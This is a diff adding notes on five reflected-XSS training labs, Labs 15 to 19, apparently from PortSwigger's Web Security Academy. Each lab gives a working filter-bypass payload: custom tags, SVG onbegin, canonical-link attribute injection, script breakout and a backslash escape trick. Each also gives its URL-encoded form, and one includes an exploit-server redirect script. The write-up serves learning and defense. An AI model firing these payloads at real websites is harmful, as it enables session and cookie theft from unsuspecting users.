@@ -784,3 +784,299 @@ If one tag or attribute is blocked, testing can reveal another allowed tag or ev
 In this lab, the bypass worked because the `body` tag and `onresize` event were allowed.
 
 The iframe made the exploit automatic, so the victim did not need to interact with the page.
+
+### Lab 15: Reflected XSS into HTML Context with All Tags Blocked Except Custom Ones
+
+This lab focused on bypassing tag-based XSS filtering using a custom HTML tag.
+
+The application blocked common tags such as:
+
+```html
+<script>
+<img>
+<svg>
+<body>
+```
+
+However, custom tags were still allowed.
+
+The successful custom tag payload was:
+
+```html
+<xss id=x onfocus=alert(document.cookie) tabindex=1>
+```
+
+The URL-encoded version was:
+
+```text
+%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E
+```
+
+The final exploit server code was:
+
+```html
+<script>
+location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
+</script>
+```
+
+The custom tag was given:
+
+```html
+id=x
+```
+
+Then the URL used:
+
+```text
+#x
+```
+
+This caused the browser to focus the injected element.
+
+The attribute:
+
+```html
+tabindex=1
+```
+
+made the custom element focusable.
+
+When the element received focus, the event handler executed:
+
+```javascript
+alert(document.cookie)
+```
+
+#### Key Takeaway
+
+Blocking standard HTML tags is not enough to prevent XSS.
+
+Custom tags can still be dangerous if event handler attributes are allowed.
+
+The combination of `id`, `tabindex`, `onfocus`, and a URL fragment can make an XSS payload execute automatically without user interaction.
+
+
+### Lab 16: Reflected XSS with Some SVG Markup Allowed
+
+This lab focused on reflected XSS using SVG markup.
+
+The application blocked common XSS payloads such as:
+
+```html
+<img src=1 onerror=alert(1)>
+```
+
+However, the filter was incomplete because it allowed some SVG tags and events.
+
+Using Burp Intruder, I found that some SVG-related tags were allowed, including:
+
+```html
+<svg>
+<animatetransform>
+<title>
+<image>
+```
+
+Then I tested event attributes and found that the allowed event was:
+
+```html
+onbegin
+```
+
+The successful payload was:
+
+```html
+"><svg><animatetransform onbegin=alert(1)>
+```
+
+The URL-encoded version was:
+
+```text
+%22%3E%3Csvg%3E%3Canimatetransform%20onbegin%3Dalert(1)%3E
+```
+
+The final URL used was:
+
+```text
+/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin%3Dalert(1)%3E
+```
+
+The payload worked because the application allowed SVG markup and the `onbegin` event handler.
+
+When the SVG animation element began, the browser executed:
+
+```javascript
+alert(1)
+```
+
+#### Key Takeaway
+
+WAFs and filters may block common HTML tags but still miss SVG-specific tags and events.
+
+SVG can be dangerous because it supports animation elements and event handlers.
+
+In this lab, the bypass worked by combining:
+
+```text
+Allowed SVG context: svg
+Allowed SVG tag: animatetransform
+Allowed event: onbegin
+JavaScript function: alert(1)
+```
+
+This shows that XSS filtering must handle HTML, SVG, attributes, and browser events, not only common tags such as `script` or `img`.
+
+### Lab 17: Reflected XSS in Canonical Link Tag
+
+This lab focused on reflected XSS inside a canonical link tag.
+
+A canonical link tag usually looks like this:
+
+```html
+<link rel="canonical" href="https://example.com/">
+```
+
+The application reflected user-controlled input inside the `href` attribute.
+
+Because angle brackets were escaped, normal HTML tag injection did not work.
+
+The successful payload was added directly to the URL:
+
+```text
+?%27accesskey=%27x%27onclick=%27alert(1)
+```
+
+Decoded, this becomes:
+
+```text
+?'accesskey='x'onclick='alert(1)
+```
+
+The payload injected two attributes into the canonical link tag:
+
+```html
+accesskey='x'
+onclick='alert(1)'
+```
+
+The `accesskey` attribute assigns a keyboard shortcut to the element.
+
+The `onclick` attribute executes JavaScript when the element is activated.
+
+#### Key Takeaway
+
+XSS can occur inside existing tags through attribute injection.
+
+Even when `<` and `>` are escaped, XSS may still be possible if quotes are not handled safely in an HTML attribute context.
+
+### Lab 18: Reflected XSS into a JavaScript String with Single Quote and Backslash Escaped
+
+This lab focused on reflected XSS inside a JavaScript string.
+
+The application escaped:
+
+```text
+'
+```
+
+and:
+
+```text
+\
+```
+
+This prevented a normal JavaScript string breakout.
+
+For example, a payload using a single quote would be escaped and kept inside the string.
+
+The successful payload was:
+
+```html
+</script><script>alert(1)</script>
+```
+
+The URL-encoded version was:
+
+```text
+%3C%2Fscript%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
+```
+
+The payload worked by closing the existing script block:
+
+```html
+</script>
+```
+
+Then injecting a new script block:
+
+```html
+<script>alert(1)</script>
+```
+
+#### Key Takeaway
+
+When input is reflected inside a JavaScript string, escaping quotes can block simple string breakout payloads.
+
+However, if angle brackets are not encoded, `</script>` can close the script block and allow a new script tag to execute.
+
+
+### Lab 19: Reflected XSS into a JavaScript String with Angle Brackets and Double Quotes HTML-Encoded and Single Quotes Escaped
+
+This lab focused on reflected XSS inside a JavaScript string.
+
+The application protected against some characters:
+
+```text id="tybsj5"
+< and > were HTML-encoded
+" was HTML-encoded
+' was escaped
+```
+
+However, the application did not escape:
+
+```text id="xbmsy9"
+\
+```
+
+This made it possible to bypass the escaping.
+
+The successful payload was:
+
+```javascript id="q6qs20"
+\'-alert(1)//
+```
+
+The URL-encoded version was:
+
+```text id="h35edi"
+%5C%27-alert%281%29%2F%2F
+```
+
+The payload worked because the original backslash combined with the application's escaping behavior and allowed the single quote to break out of the JavaScript string.
+
+The JavaScript became similar to:
+
+```javascript id="qz1mco"
+var searchTerms = '\\'-alert(1)//';
+```
+
+Then the payload executed:
+
+```javascript id="ut9hyd"
+alert(1)
+```
+
+and used:
+
+```javascript id="1fz95m"
+//
+```
+
+to comment out the rest of the line.
+
+#### Key Takeaway
+
+Escaping single quotes alone is not enough in a JavaScript string context.
+
+Backslashes must also be escaped correctly because they can change how the browser interprets quotes.
